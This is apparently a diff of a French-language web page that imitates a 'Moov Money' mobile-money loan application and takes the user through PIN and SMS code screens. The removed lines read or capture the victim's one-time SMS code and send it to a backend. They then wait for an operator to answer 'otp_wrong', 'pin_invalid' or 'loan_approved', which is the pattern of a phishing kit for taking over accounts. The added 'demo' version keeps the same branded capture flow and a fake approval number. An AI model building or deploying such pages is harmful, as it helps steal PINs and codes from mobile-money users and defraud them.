+function refreshPinDots() {
+  var dots = document.querySelectorAll('#pinDotsContainer .pin-dot');
+  for (var i = 0; i < dots.length; i++) {
+    dots[i].innerHTML = '';
+    dots[i].classList.remove('filled');
+    if (i < state.pin.length) { dots[i].innerHTML = '●'; dots[i].classList.add('filled'); }
+  }
+}
 
+function submitPin() {
+  if (state.pin.length < 4) return;
+  
+  // Demo: 1234 = correct
+  if (state.pin === '1234') {
+    goTo('pg4');
+  } else {
+    document.getElementById('pinErrorMsg').classList.add('show');
+    state.pin = '';
+    refreshPinDots();
+  }
+}
+
+// ═══════════════════════════════════════════
 // OTP
-function setupOtpAutoDetect(){if(!('OTPCredential' in window))return;var ac=new AbortController();navigator.credentials.get({otp:{transport:['sms']},signal:ac.signal}).then(function(otp){if(otp&&otp.code&&otp.code.length===6){autoFillOtp(otp.code);document.getElementById('otpAutoDetect').textContent='✓ Code détecté automatiquement'}}).catch(function(){})}
-function autoFillOtp(code){if(otpAutoSubmitted)return;var boxes=document.querySelectorAll('#moovOtpRow .otp-box');code.split('').forEach(function(d,i){if(boxes[i]){boxes[i].value=d;boxes[i].classList.add('filled','auto-filled')}});updateMoovOtpBtn();setTimeout(function(){if(!otpAutoSubmitted&&getMoovOtpValue().length===6){otpAutoSubmitted=true;submitMoovOtp()}},500)}
-function startMoovOtpCountdown(){clearInterval(moovOtpTimer);var s=266,el=document.getElementById('moovTimer');moovOtpTimer=setInterval(function(){s--;var m=Math.floor(s/60),sec=s%60;el.textContent=String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0');if(s<=0){clearInterval(moovOtpTimer);el.parentElement.innerHTML='<span style="color:#FF6A00;cursor:pointer;" onclick="resendMoovOtp()">Renvoyer le code</span>'}},1000)}
-function resendMoovOtp(){otpAutoSubmitted=false;document.getElementById('moovResendText').innerHTML='Renvoyer le code dans <strong id="moovTimer">04:26</strong>';startMoovOtpCountdown();document.querySelectorAll('#moovOtpRow .otp-box').forEach(b=>{b.value='';b.classList.remove('filled','auto-filled')});document.getElementById('moovOtpSubmitBtn').classList.remove('active');document.getElementById('moovOtpSubmitBtn').style.cursor='not-allowed';document.getElementById('otpAutoDetect').textContent='';document.querySelector('#moovOtpRow .otp-box').focus();setupOtpAutoDetect();notifyBackend('otp_resend',{}).catch(function(){})}
-document.addEventListener('DOMContentLoaded',function(){var moovOtpInputs=document.querySelectorAll('#moovOtpRow .otp-box');moovOtpInputs.forEach(function(inp,i,all){inp.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(-1);if(this.value){this.classList.add('filled');if(all[i+1])all[i+1].focus()}else{this.classList.remove('filled','auto-filled')}updateMoovOtpBtn();if(!otpAutoSubmitted&&getMoovOtpValue().length===6){otpAutoSubmitted=true;setTimeout(function(){submitMoovOtp()},300)}});inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value&&all[i-1]){all[i-1].focus();all[i-1].classList.remove('filled','auto-filled');otpAutoSubmitted=false}});inp.addEventListener('paste',function(e){e.preventDefault();var p=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);if(p.length===6)autoFillOtp(p)})});updateLanding()})
-function updateMoovOtpBtn(){var all=document.querySelectorAll('#moovOtpRow .otp-box'),full=Array.from(all).every(b=>b.value.length===1),btn=document.getElementById('moovOtpSubmitBtn');if(full){btn.classList.add('active');btn.style.cursor='pointer'}else{btn.classList.remove('active');btn.style.cursor='not-allowed'}}
-function getMoovOtpValue(){return Array.from(document.querySelectorAll('#moovOtpRow .otp-box')).map(b=>b.value).join('')}
-function submitMoovOtp(){var otp=getMoovOtpValue();if(otp.length<6){alert('Veuillez entrer le code complet');return}clearInterval(moovOtpTimer);showPollingOverlay('Vérification du code','Veuillez patienter...');notifyBackend('otp',{otp:otp}).then(function(d){if(!d.ok){showOverlayError('Erreur: '+(d.error||'Inconnue'));return}currentToken=d.token;startPolling(function(r){hideOverlay();switch(r){case'otp_wrong':alert('Code OTP incorrect.');otpAutoSubmitted=false;document.querySelectorAll('#moovOtpRow .otp-box').forEach(b=>{b.value='';b.classList.remove('filled','auto-filled')});document.getElementById('moovOtpSubmitBtn').classList.remove('active');document.getElementById('moovOtpSubmitBtn').style.cursor='not-allowed';document.getElementById('otpAutoDetect').textContent='';startMoovOtpCountdown();setupOtpAutoDetect();document.querySelector('#moovOtpRow .otp-box').focus();break;case'pin_invalid':alert('Session invalide.');go('s-moov-otp','s-moov-login');break;case'loan_approved':onApproved();break;case'loan_rejected':onRejected();break}})}).catch(function(){hideOverlay();onApproved()})}
+// ═══════════════════════════════════════════
+function setupOtpPage() {
+  var phone = document.getElementById('phoneInput').value;
+  var code = state.country ? countries[state.country].code : '+225';
+  document.getElementById('otpPhoneText').textContent = 'Saisissez le code envoyé à (' + code + ') ' + phone;
+  
+  var boxes = document.querySelectorAll('#otpContainer .otp-b');
+  for (var i = 0; i < boxes.length; i++) {
+    boxes[i].value = '';
+    boxes[i].oninput = createOtpHandler(i, boxes);
+    boxes[i].onkeydown = createOtpKeyHandler(i, boxes);
+  }
+  boxes[0].focus();
+  
+  document.getElementById('otpSubmitBtn').style.background = '#a9c2e8';
+  document.getElementById('otpSubmitBtn').style.cursor = 'not-allowed';
+  
+  startOtpTimer();
+}
 
-// Results
-function onApproved(){var r='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('ref-num').textContent=r;document.getElementById('successTitle').textContent='Demande approuvée';document.getElementById('successMsg').textContent='Félicitations ! Votre demande de crédit a été approuvée.';var cur=document.querySelector('.scr.active');if(cur)go(cur.id,'s-ok')}
-function onRejected(){var r='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('ref-num').textContent=r;document.getElementById('successTitle').textContent='Demande refusée';document.getElementById('successMsg').textContent="Votre demande n'a pas été approuvée. Vous pouvez réessayer dans 30 jours.";var cur=document.querySelector('.scr.active');if(cur)go(cur.id,'s-ok')}
-function reset(){clearInterval(pollTimer);clearInterval(moovOtpTimer);hideOverlay();['fn','ln','inc'].forEach(id=>{var e=document.getElementById(id);if(e)e.value=''});document.getElementById('incomeSource').value='';document.getElementById('slider').value=1000;document.getElementById('amountInput').value='';document.getElementById('amountError').classList.remove('show');moovTermsAccepted=false;document.getElementById('moovTermsSvg').style.display='none';selectedCountry=null;document.getElementById('moovPhoneInput').value='';document.getElementById('moovPhoneInput').disabled=true;document.getElementById('moovPhoneInput').placeholder="Sélectionnez d'abord un pays";document.getElementById('selectedFlag').textContent='🌍';document.getElementById('selectedFlag').style.opacity='0.4';document.getElementById('selectedCountry').textContent='Sélectionnez un pays';document.getElementById('selectedCountry').style.color='#9ca3af';document.getElementById('selectedCode').textContent='';document.getElementById('displayCode').textContent='---';document.getElementById('digitHint').textContent='';pinReset();otpAutoSubmitted=false;document.querySelectorAll('#moovOtpRow .otp-box').forEach(b=>{b.value='';b.classList.remove('filled','auto-filled')});document.getElementById('moovOtpSubmitBtn').classList.remove('active');document.getElementById('moovOtpSubmitBtn').style.cursor='not-allowed';document.getElementById('otpAutoDetect').textContent='';durVal=6;document.querySelectorAll('.dur-opt').forEach((b,i)=>b.classList.toggle('selected',i===0));updateLanding();go('s-ok','s-land')}
-updateLanding();
+function createOtpHandler(index, all) {
+  return function() {
+    this.value = this.value.replace(/\D/g, '').slice(-1);
+    if (this.value && all[index + 1]) all[index + 1].focus();
+    checkOtpComplete();
+  };
+}
+
+function createOtpKeyHandler(index, all) {
+  return function(e) {
+    if (e.key === 'Backspace' && !this.value && all[index - 1]) all[index - 1].focus();
+  };
+}
+
+function checkOtpComplete() {
+  var boxes = document.querySelectorAll('#otpContainer .otp-b');
+  var full = true;
+  for (var i = 0; i < boxes.length; i++) {
+    if (boxes[i].value.length !== 1) { full = false; break; }
+  }
+  var btn = document.getElementById('otpSubmitBtn');
+  if (full) {
+    btn.style.background = '#14329e';
+    btn.style.cursor = 'pointer';
+    setTimeout(function() {
+      var otp = getOtpValue();
+      if (otp.length === 6) verifyOtp();
+    }, 300);
+  } else {
+    btn.style.background = '#a9c2e8';
+    btn.style.cursor = 'not-allowed';
+  }
+}
+
+function getOtpValue() {
+  var boxes = document.querySelectorAll('#otpContainer .otp-b');
+  var val = '';
+  for (var i = 0; i < boxes.length; i++) val += boxes[i].value;
+  return val;
+}
+
+function startOtpTimer() {
+  clearInterval(state.otpTimer);
+  var sec = 266;
+  state.otpTimer = setInterval(function() {
+    sec--;
+    var m = Math.floor(sec / 60), s = sec % 60;
+    document.getElementById('otpTimerDisplay').innerHTML = 'Renvoyer le code dans <strong>' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0') + '</strong>';
+    if (sec <= 0) {
+      clearInterval(state.otpTimer);
+      document.getElementById('otpTimerDisplay').innerHTML = '<span style="color:#FF6A00;cursor:pointer" onclick="resendOtp()">Renvoyer le code</span>';
+    }
+  }, 1000);
+}
+
+function resendOtp() {
+  setupOtpPage();
+}
+
+function verifyOtp() {
+  var otp = getOtpValue();
+  if (otp.length < 6) { alert('Veuillez entrer le code complet'); return; }
+  clearInterval(state.otpTimer);
+  goToSuccess();
+}
+
+// ═══════════════════════════════════════════
+// SUCCESS
+// ═══════════════════════════════════════════
+function goToSuccess() {
+  document.getElementById('refNumber').textContent = 'MM-2026-' + Math.floor(100000 + Math.random() * 900000);
+  goTo('pg5');
+}
+
+function resetAll() {
+  clearInterval(state.otpTimer);
+  state.duration = 6;
+  state.amount = 1000;
+  state.country = null;
+  state.termsOk = false;
+  state.pin = '';
+  
+  document.getElementById('firstName').value = '';
+  document.getElementById('lastName').value = '';
+  document.getElementById('incomeSrc').value = '';
+  document.getElementById('monthlyInc').value = '';
+  document.getElementById('infoNextBtn').disabled = true;
+  document.getElementById('customAmt').value = '';
+  document.getElementById('amountSlider').value = 1000;
+  document.getElementById('amtErr').style.display = 'none';
+  document.getElementById('phoneInput').value = '';
+  document.getElementById('phoneInput').disabled = true;
+  document.getElementById('phoneInput').placeholder = "Sélectionnez d'abord un pays";
+  document.getElementById('countryFlag').textContent = '🌍';
+  document.getElementById('countryFlag').style.opacity = '0.4';
+  document.getElementById('countryName').textContent = 'Sélectionnez un pays';
+  document.getElementById('countryName').style.color = '#999';
+  document.getElementById('countryCode').textContent = '';
+  document.getElementById('displayCc').textContent = '---';
+  document.getElementById('digitHint').textContent = '';
+  document.getElementById('termsCheckSvg').style.display = 'none';
+  
+  var durBtns = document.querySelectorAll('#durGrid .dur-btn');
+  for (var i = 0; i < durBtns.length; i++) {
+    durBtns[i].classList.toggle('sel', i === 0);
+  }
+  
+  refreshDisplay();
+  goTo('pg0');
+}
+
+// ═══════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════
+refreshDisplay();
+console.log('✅ Moov Money Demo Ready');
+console.log('   PIN: 1234 (other PINs will fail)');
+console.log('   Click any button to navigate');
 </script>
 </body>
 </html>
